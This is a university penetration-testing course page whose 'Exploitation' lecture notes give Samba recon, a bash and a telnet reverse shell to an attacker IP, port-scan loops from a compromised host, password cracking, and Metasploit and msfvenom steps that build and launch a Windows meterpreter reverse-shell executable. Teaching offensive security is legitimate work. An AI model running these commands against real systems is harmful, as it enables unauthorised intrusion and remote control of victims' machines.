<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="Vitaly Ford smart grid security research">
    <meta name="author" content="Vitaly Ford">
    <link rel="icon" href="../../../favicon.ico">

    <title>Vitaly Ford's Personal Website</title>

    <!-- Bootstrap core CSS -->
    <link href="../css/bootstrap.min.css" rel="stylesheet">

    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <link href="../css/ie10-viewport-bug-workaround.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="../css/navbar-fixed-top.css" rel="stylesheet">

    <script src="../js/ie-emulation-modes-warning.js"></script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  </head>

  <body>

    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <p class="navbar-brand" href="#">Vitaly Ford</p>
        </div>
        <div id="navbar" class="navbar-collapse collapse">
          <ul class="nav navbar-nav">
            <li><a href="../index.html">Home</a></li>
            <li><a href="../research.html">Research</a></li>
            <li><a href="../publications.html">Publications</a></li>
            <li><a href="../docs/VitalyFordResume.pdf" target="_blank" rel="noopener norefferer">Resume</a></li>
            <li><a href="../contact.html">Contact</a></li>
      			<li class="dropdown">
      			  <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">CSC 2120 <span class="caret"></span></a>
      			  <ul class="dropdown-menu">
        				<li><a href="../2120syllabus.html">Syllabus</a></li>
        				<li><a href="../2120programs.html">Programs</a></li>
                <li><a href="../2120examples.html">Examples</a></li>
        				<li><a href="../schedule.html">Office Hours Schedule</a></li>
      			  </ul>
      			</li>
            <li class="dropdown">
              <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">CSC 2121 <span class="caret"></span></a>
              <ul class="dropdown-menu">
                <li><a href="../2121syllabus.html">Syllabus</a></li>
                <li><a href="../2121labs.html">Labs</a></li>
                <li><a href="../schedule.html">Office Hours Schedule</a></li>
              </ul>
            </li>
            <li class="dropdown">
              <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">CSC 2901 <span class="caret"></span></a>
              <ul class="dropdown-menu">
				<li><a href="CSC2901syllabus.pdf">Syllabus</a></li>
				<li><a href="00-Videos.html">00 Recordings</a></li>
                <li><a href="01-Background.html">01 Background</a></li>
                <li><a href="02-Assessment-Planning.html">02 Assessment Planning</a></li>
                <li><a href="03-Passive-Intelligence-Gathering.html">03 Passive Recon</a></li>
                <li><a href="04-Active-Intelligence-Gathering.html">04 Active Recon</a></li>
                <li class="active"><a href="05-Exploitation.html">05 Exploitation</a></li>
                <li><a href="06-Post-Exploitation.html">06 Post-Exploitation</a></li>
				<li><a href="07-Useful-Resources.html">07 Useful Resources</a></li>
              </ul>
            </li>
          </ul>
        </div><!--/.nav-collapse -->
      </div>
    </nav>

    <div class="container">

      <!-- Main component for a primary marketing message or call to action -->
      <div class="normal-text style-2901">
        <h2><code> &gt;&gt; CSC 2901 - Exploitation</code></h2>
        <p>The whole goal of exploitation is to expose data that can be leaked and show how the overall organization can be damaged if vulnerabilities are not mitigated. A possibility of planting a backdoor and using a machine in a botnet would be a good reason for the organization to listen to you.</p>
        <h2><a id="Samba_2"></a>Samba</h2>
        <p>If you see a port 139/TCP being open, do some samba recon and figure out what version is running.<br>
        <code>-L</code> parameter connects to the following IP.<br>
        <code>-N</code> parameter tells that we do not have the root password.</p>
        <pre><code class="language-sh">$ nmblookup -A IP_TARGET
$ smbclient -L IP_TARGET -N
$ smbclient -L //SHARE_NAME -I IP_TARGET
        </code></pre>
        <p>Interactive shell</p>
        <pre><code class="language-sh">$ /bin/sh -i
        </code></pre>
        <h2><a id="Exploit_Search_15"></a>Exploit Search</h2>
        <p>Navigate to <a href="https://www.exploit-db.com">https://www.exploit-db.com</a> or</p>
        <pre><code class="language-sh">
$ searchsploit NAME
$ searchsploit samba
        </code></pre>
        <h2><a id="A_shell_back_to_you_21"></a>A shell back to you</h2>
        <p>Set up NetCat on your box that will be listening on port 5757: <code>$ nc -l -p 5757 -vv</code><br>
        Call a command on the target: <code>$ /bin/bash -i &gt; /dev/tcp/YOUR_ATTACKER_IP/5757 0&lt;&amp;1 2&gt;&amp;1</code></p>
        <h2><a id="Magic_Port_Scan_and_Shell_24"></a>Magic Port Scan and Shell</h2>
        <p>Assuming that you are on the machine you have compromised, you can do the following to perform a port scan of any IP you want:</p>
        <pre><code class="language-sh">$ port=<span class="hljs-number">1</span>; <span class="hljs-keyword">while</span> [ <span class="hljs-variable">$port</span> <span class="hljs-operator">-lt</span> <span class="hljs-number">1024</span> ]; <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> &gt; /dev/tcp/IP_ANOTHER_TARGET/<span class="hljs-variable">$port</span>; [ $? == <span class="hljs-number">0</span> ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-variable">$port</span> <span class="hljs-string">"is open"</span> &gt;&gt; /tmp/ports.txt; port=`expr <span class="hljs-variable">$port</span> + <span class="hljs-number">1</span>`; <span class="hljs-keyword">done</span>
        </code></pre>
        <p>Similarly, you can do this:</p>
        <pre><code class="language-sh">$ <span class="hljs-keyword">for</span> ((i=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">65535</span>; i++)); <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> &gt; /dev/tcp/IP/<span class="hljs-variable">$i</span> &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-variable">$i</span> open; <span class="hljs-keyword">done</span> <span class="hljs-number">2</span>&gt;/dev/null
        </code></pre>
        <p>More old school stuff for communicating with the box over telnet:</p>
        <pre><code class="language-sh">$ telnet attacker_IP PORT1 | /bin/bash | telnet attacker_IP PORT2
        </code></pre>
        <h2><a id="Password_BruteForcing_37"></a>Password Brute-Forcing</h2>
        <pre><code class="language-sh">$ john --wordlist=rockyou.txt --rules=Jumbo hashes.txt
        </code></pre>
        <h2><a id="Metasploit_42"></a>Metasploit</h2>
        <h3><a id="Learn_Metasploit_43"></a>Learn Metasploit</h3>
        <p><a href="http://securitytube.net">securitytube.net</a> --&gt; megaprimers --&gt; metasploit framework expert<br>
        <a href="http://opensecuritytraining.info">opensecuritytraining.info</a><br>
        Metasploit-unleashed<br>
        Metasploit cheat-sheet: <a href="https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf">https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf</a></p>
        <h3><a id="Setting_up_Metasploit_48"></a>Setting up Metasploit</h3>
        <p>First, let’s set up the database:</p>
        <pre><code class="language-sh">
$ service postgresql start
$ msfdb init
        </code></pre>
        <p>Now we can open metasploit, type: <code>msfconsole</code><br>
        We can create our own workspace for future use: <code>workspace -a CSC2901</code><br>
        Then, type <code>workspace CSC2901</code> to use the workspace. It will allow us to store all the details of the pentest in one space that can be used to refer to later on.<br>
        You can do nmap scan within Metasploit:</p>
        <pre><code class="language-sh">msf&gt; db_nmap <span class="hljs-operator">-s</span>S <span class="hljs-operator">-s</span>V <span class="hljs-operator">-s</span>C IP_TARGET
        </code></pre>
        <p>You can type commands like <code>hosts</code> and <code>services</code> to see the results in a nice format.<br>
        You can search for exploits inside of Metasploit: <code>search samba</code><br>
        To use a certain exploit, type <code>use</code> with the full path to the exploit after seraching for it:</p>
        <pre><code class="language-sh">msf&gt; use exploit/linux/service_name/exploit_name
        </code></pre>
        <p>Type <code>info</code> to see the information about the exploit.<br>
        Type <code>show options</code> to see what options you need to set for the exploit to be initiated.<br>
        <code>RHOST</code> is the remote host, the IP of the TARGET.<br>
        Type <code>set RHOST IP_TARGET</code>.<br>
        Now we also need to set a payload that will be sent across the wire from us to the TARGET. When the TARGET is compromised by the exploit, it will use the payload to connect back to us – a so-called “reverse shell”.<br>
        Type <code>show payloads</code> to see all available payloads.<br>
        Type <code>set payload linux/x86/shell/reverse_tcp</code><br>
        <code>LHOST</code> is the IP of our Kali box, this is the IP where the TARGET will connect back when it is compromised.<br>
        <code>LPORT</code> the port of our Kali box to which the TARGET will try to connect.<br>
        Now we are rady to exploit, type <code>exploit</code></p>
        <h2><a id="Web_Pentest_77"></a>Web Pentest</h2>
		
        <p>Load balancing detection: <code>lbd website.com</code><br>
        Detecting web application firewalls: <code>wafw00f website.com</code><br>
        Use w3af, Vega, or OWASP ZAP Proxy to do the pentest for the website.</p>
		
		<h2>Running <b>msfvenom</b> for generating the file to be uploaded to the machine</h2>
		<code>msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.50.142 LPORT=443 -f exe -o my_shell.exe</code><br>
		<p>Running a listener for my_shell.exe</p>
        <pre><code class="language-sh">use exploit/multi/handler
<span class="hljs-built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp
<span class="hljs-built_in">set</span> ExitOnSession <span class="hljs-literal">false</span>
<span class="hljs-built_in">set</span> LHOST 192.168.50.142
<span class="hljs-built_in">set</span> LPORT 443
exploit
        </code></pre>
		<p>You can upload my_shell.exe to the machine if you have a meterpreter session established already:</p>
		<code>upload my_shell.exe</code><br>
		<p>Then you launch it by dropping to <i>shell</i> in Windows and calling my_shell.exe</p>
		<code>msf> shell</code><br>
		Type <code>my_shell.exe</code><br>
      </div>

    </div> <!-- /container -->


    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script>window.jQuery || document.write('<script src="../js/jquery.min.js"><\/script>')</script>
    <script src="../js/bootstrap.min.js"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="../js/ie10-viewport-bug-workaround.js"></script>
  </body>
</html>
